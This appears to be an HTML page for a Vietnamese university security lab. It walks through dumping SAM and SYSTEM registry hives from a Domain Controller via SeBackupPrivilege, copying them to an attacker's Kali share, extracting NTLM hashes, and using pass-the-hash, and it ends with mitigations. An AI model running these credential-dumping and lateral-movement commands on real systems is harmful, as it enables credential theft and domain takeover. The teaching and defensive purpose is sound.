@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 3 - DC01: Domain Controller Attack via SeBackupPrivilege</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #2d5aa0 0%, #1e3c72 50%, #2a5298 100%);
+            min-height: 100vh;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+
+        .difficulty-badge {
+            background: #e74c3c;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        .content-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+
+        .section-title {
+            color: #2c3e50;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #2d5aa0;
+            padding-bottom: 10px;
+        }
+
+        .objective-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .objective-list li {
+            padding: 10px 0;
+            padding-left: 30px;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+
+        .objective-list li:before {
+            content: "🎯";
+            position: absolute;
+            left: 0;
+            font-size: 1.2rem;
+        }
+
+        .scenario-box {
+            background: linear-gradient(45deg, #e74c3c 0%, #c0392b 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .scenario-box h3 {
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .attack-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .step-card {
+            background: #f8f9fa;
+            border: 2px solid #2d5aa0;
+            border-radius: 10px;
+            padding: 20px;
+            transition: transform 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(45, 90, 160, 0.2);
+        }
+
+        .step-number {
+            background: #2d5aa0;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+        }
+
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid #2d5aa0;
+        }
+
+        .payload-example {
+            background: #fff5f5;
+            border: 2px solid #e53e3e;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .payload-example h4 {
+            color: #e53e3e;
+            margin-bottom: 10px;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+
+        .critical-box {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .critical-box h4 {
+            color: #721c24;
+            margin-bottom: 10px;
+        }
+
+        .mitigation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .mitigation-card {
+            background: #f0f8ff;
+            border-left: 4px solid #4a90e2;
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .mitigation-card h4 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+
+        .topology-section {
+            background: #f8f9fa;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .topology-item {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            padding: 15px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .topology-icon {
+            font-size: 2rem;
+            margin-right: 15px;
+        }
+
+        .results-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .result-card {
+            background: #e8f5e8;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .result-card h4 {
+            color: #155724;
+            margin-bottom: 10px;
+        }
+
+        .lab-actions {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .action-button {
+            background: linear-gradient(45deg, #2d5aa0, #1e3c72);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: bold;
+            margin: 10px;
+            transition: all 0.3s ease;
+            font-size: 1.1rem;
+        }
+
+        .action-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(45, 90, 160, 0.3);
+        }
+
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .privilege-box {
+            background: #fff3e0;
+            border: 2px solid #ff9800;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .privilege-box h4 {
+            color: #e65100;
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .attack-steps {
+                grid-template-columns: 1fr;
+            }
+            
+            .mitigation-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .results-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <a href="/labs" class="back-btn">← Quay lại Labs</a>
+    
+    <div class="container">
+        <div class="header">
+            <h1>🏰 Lab 3 - DC01</h1>
+            <p class="subtitle">Domain Controller Attack via SeBackupPrivilege Exploitation</p>
+            <div class="difficulty-badge">ADVANCED</div>
+        </div>
+
+        <!-- Tổng quan Lab -->
+        <div class="content-section">
+            <h2 class="section-title">📋 Tổng quan Lab</h2>
+            <div class="scenario-box">
+                <h3>🎯 Kịch bản tấn công</h3>
+                <p>Kịch bản này mô phỏng quá trình khai thác khi một tài khoản người dùng thông thường trong hệ thống (studentA) đã bị chiếm quyền và được sử dụng để đăng nhập vào máy trạm trong domain. Sau đó, kẻ tấn công sử dụng tài khoản <strong>soict_hungpn</strong> có quyền SeBackupPrivilege để trực tiếp tấn công Domain Controller và dump toàn bộ hash mật khẩu của hệ thống.</p>
+            </div>
+            
+            <h3>🎯 Mục tiêu học tập</h3>
+            <ul class="objective-list">
+                <li>Hiểu về quyền SeBackupPrivilege và cách khai thác</li>
+                <li>Học cách dump registry hives (SAM, SYSTEM) từ Domain Controller</li>
+                <li>Thực hành trích xuất hash NTLM từ các file registry</li>
+                <li>Phân tích tác động của việc thiếu kiểm soát phân quyền</li>
+                <li>Áp dụng các biện pháp phòng thủ cho Active Directory</li>
+            </ul>
+        </div>
+
+        <!-- Mô hình triển khai -->
+        <div class="content-section">
+            <h2 class="section-title">🏗️ Mô hình triển khai</h2>
+            <div class="topology-section">
+                <div class="topology-item">
+                    <div class="topology-icon">🖥️</div>
+                    <div>
+                        <strong>Workstation01 (Đã bị kiểm soát)</strong><br>
+                        Máy trạm trong domain đã bị compromise, sử dụng làm bàn đạp tấn công
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🏰</div>
+                    <div>
+                        <strong>SVR-DC01 (Domain Controller)</strong><br>
+                        Máy chủ Active Directory chứa toàn bộ thông tin xác thực của domain
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">👤</div>
+                    <div>
+                        <strong>Tài khoản soict_hungpn</strong><br>
+                        Tài khoản thuộc nhóm Backup Operators, có quyền SeBackupPrivilege
+                    </div>
+                </div>
+                <div class="topology-item">
+                    <div class="topology-icon">🔐</div>
+                    <div>
+                        <strong>Registry Hives</strong><br>
+                        SAM và SYSTEM registry chứa hash mật khẩu của các tài khoản
+                    </div>
+                </div>
+            </div>
+
+            <div class="privilege-box">
+                <h4>🔑 Quyền SeBackupPrivilege</h4>
+                <p>Quyền này cho phép người dùng đọc tất cả các file và registry key trên hệ thống, bỏ qua DACL (Discretionary Access Control List). Thường được cấp cho nhóm Backup Operators để thực hiện sao lưu hệ thống.</p>
+            </div>
+        </div>
+
+        <!-- Các bước thực hiện -->
+        <div class="content-section">
+            <h2 class="section-title">⚡ Các bước thực hiện chi tiết</h2>
+            
+            <div class="attack-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Kiểm tra quyền hạn</h3>
+                    <p>Đăng nhập vào Domain Controller với tài khoản soict_hungpn và kiểm tra các nhóm mà tài khoản thuộc về.</p>
+                    <div class="code-block">
+# Kiểm tra group membership
+whoami /groups
+
+# Tìm kiếm Backup Operators group
+# Xác nhận có quyền SeBackupPrivilege
+                    </div>
+                    <div class="critical-box">
+                        <h4>⚠️ Phát hiện quan trọng</h4>
+                        <p>Tài khoản soict_hungpn thuộc nhóm Backup Operators → có quyền SeBackupPrivilege</p>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Dump Registry Hives</h3>
+                    <p>Sử dụng quyền SeBackupPrivilege để sao lưu registry hives chứa thông tin xác thực.</p>
+                    <div class="code-block">
+# Dump SAM registry (chứa hash local accounts)
+reg save hklm\SAM C:\Users\Public\sam.save
+
+# Dump SYSTEM registry (chứa bootkey để giải mã SAM)
+reg save hklm\SYSTEM C:\Users\Public\system.save
+
+# Kiểm tra file đã được tạo
+dir C:\Users\Public\*.save
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Chuyển file về Kali</h3>
+                    <p>Sao chép các file registry về máy Kali để tiến hành phân tích offline.</p>
+                    <div class="code-block">
+# Trên Kali - tạo SMB share hoặc sử dụng SCP
+# Hoặc sử dụng PowerShell để download
+
+# Trên DC - copy file
+copy C:\Users\Public\sam.save \\kali-ip\share\
+copy C:\Users\Public\system.save \\kali-ip\share\
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3>Trích xuất hash NTLM</h3>
+                    <p>Sử dụng công cụ secretsdump.py từ Impacket để trích xuất hash từ registry files.</p>
+                    <div class="code-block">
+# Trên Kali Linux
+secretsdump.py -sam sam.save -system system.save LOCAL
+
+# Kết quả sẽ hiển thị:
+# Administrator:500:hash1:hash2:::
+# Guest:501:hash1:hash2:::
+# [other accounts...]
+                    </div>
+                    <div class="payload-example">
+                        <h4>📋 Kết quả thu được:</h4>
+                        <p>• Hash NTLM của tất cả local accounts<br>
+                        • Hash của Administrator account<br>
+                        • Có thể sử dụng Pass-the-Hash hoặc crack offline</p>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">5</div>
+                    <h3>Khai thác hash</h3>
+                    <p>Sử dụng hash thu được để mở rộng quyền truy cập trong domain.</p>
+                    <div class="code-block">
+# Crack hash với hashcat
+hashcat -m 1000 -a 0 hash.txt wordlist.txt
+
+# Hoặc sử dụng Pass-the-Hash
+psexec.py -hashes :hash administrator@target-ip
+
+# Lateral movement với wmiexec
+wmiexec.py -hashes :hash domain/user@target
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">6</div>
+                    <h3>Phân tích hậu khai thác</h3>
+                    <p>Đánh giá tác động và lập kế hoạch mở rộng cuộc tấn công.</p>
+                    <div class="warning-box">
+                        <h4>🔥 Tác động nghiêm trọng</h4>
+                        <p>• Kiểm soát hoàn toàn Domain Controller<br>
+                        • Truy cập tất cả hash mật khẩu trong domain<br>
+                        • Khả năng tạo Golden Ticket<br>
+                        • Persistent access vào toàn bộ mạng nội bộ</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kết quả thu được -->
+        <div class="content-section">
+            <h2 class="section-title">🎯 Kết quả thu được</h2>
+            <div class="results-grid">
+                <div class="result-card">
+                    <h4>✅ Truy cập DC thành công</h4>
+                    <p>Đăng nhập trực tiếp vào Domain Controller với tài khoản không phải Domain Admin nhưng có quyền đặc biệt.</p>
+                </div>
+                <div class="result-card">
+                    <h4>✅ Dump registry thành công</h4>
+                    <p>Thu thập được file SAM và SYSTEM chứa toàn bộ thông tin xác thực local accounts.</p>
+                </div>
+                <div class="result-card">
+                    <h4>✅ Trích xuất hash NTLM</h4>
+                    <p>Giải mã thành công hash mật khẩu của tất cả tài khoản local trên Domain Controller.</p>
+                </div>
+                <div class="result-card">
+                    <h4>✅ Khả năng mở rộng tấn công</h4>
+                    <p>Có thể sử dụng Pass-the-Hash hoặc crack offline để chiếm quyền thêm nhiều hệ thống khác.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Phân tích kỹ thuật -->
+        <div class="content-section">
+            <h2 class="section-title">🔍 Phân tích kỹ thuật tấn công</h2>
+            
+            <h3>🔑 Khai thác quyền SeBackupPrivilege</h3>
+            <p>Tài khoản soict_hungpn dù không phải admin nhưng thuộc nhóm Backup Operators, qua đó có quyền SeBackupPrivilege. Quyền này cho phép bỏ qua DACL khi truy cập file hệ thống với mục đích sao lưu, tạo ra lỗ hổng bảo mật nghiêm trọng.</p>
+
+            <h3>🚫 Không cần leo thang đặc quyền</h3>
+            <p>Toàn bộ quá trình được thực hiện mà không cần nâng quyền lên SYSTEM hay ADMIN. Backup Operators đã được cấp sẵn các đặc quyền đặc biệt, thể hiện nguy hiểm của việc phân quyền không chặt chẽ.</p>
+
+            <h3>🔍 Dump offline - tránh phát hiện</h3>
+            <p>Bằng cách dump registry rồi phân tích ngoại tuyến, attacker tránh được việc bị phát hiện bởi các giải pháp EDR/AV. Việc crack hoặc sử dụng hash được thực hiện hoàn toàn ngoài hệ thống mục tiêu.</p>
+        </div>
+
+        <!-- Biện pháp phòng thủ -->
+        <div class="content-section">
+            <h2 class="section-title">🛡️ Biện pháp phòng thủ khuyến nghị</h2>
+            <div class="mitigation-grid">
+                <div class="mitigation-card">
+                    <h4>🔒 Principle of Least Privilege</h4>
+                    <p>Chỉ cấp quyền Backup Operators cho những tài khoản thật sự cần sử dụng tính năng sao lưu hệ thống. Tránh cấp quyền này cho tài khoản giảng viên hoặc hỗ trợ kỹ thuật.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>📊 Giám sát Registry Access</h4>
+                    <p>Kích hoạt auditing cho registry key HKLM\SAM và HKLM\SYSTEM. Thiết lập cảnh báo khi có hành vi dump registry bất thường.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>🔍 Monitoring Commands</h4>
+                    <p>Giám sát việc sử dụng các lệnh như reg save, secretsdump.py, rundll32, psexec trên Domain Controller thông qua EDR/SIEM.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>👥 Account Separation</h4>
+                    <p>Tách biệt tài khoản quản trị thành hai loại: tài khoản công việc thường ngày và tài khoản quản trị chuyên biệt chỉ dùng cho DC.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>📋 Regular Audit</h4>
+                    <p>Thường xuyên rà soát membership của các nhóm đặc quyền như Administrators, Backup Operators, Server Operators bằng PowerShell hoặc GPO auditing.</p>
+                </div>
+                <div class="mitigation-card">
+                    <h4>🚫 Restrict Privileged Groups</h4>
+                    <p>Không cấp quyền "ngầm" cho giảng viên hoặc sinh viên. Các nhóm teacher, student nên được giới hạn quyền trong OU riêng.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Hành động -->
+        <div class="lab-actions">
+            <a href="#" class="action-button">
+                🚀 Bắt đầu thực hành
+            </a>
+            <a href="/labs" class="action-button" style="background: linear-gradient(45deg, #6c757d, #495057);">
+                📚 Quay lại Labs
+            </a>
+        </div>
+
+        <div style="text-align: center; margin-top: 40px; color: white;">
+            <p style="opacity: 0.8;">
+                ⚠️ Lab này chỉ dành cho mục đích học tập và nghiên cứu bảo mật - Không sử dụng cho mục đích bất hợp pháp
+            </p>
+        </div>
+    </div>
+</body>
+</html>
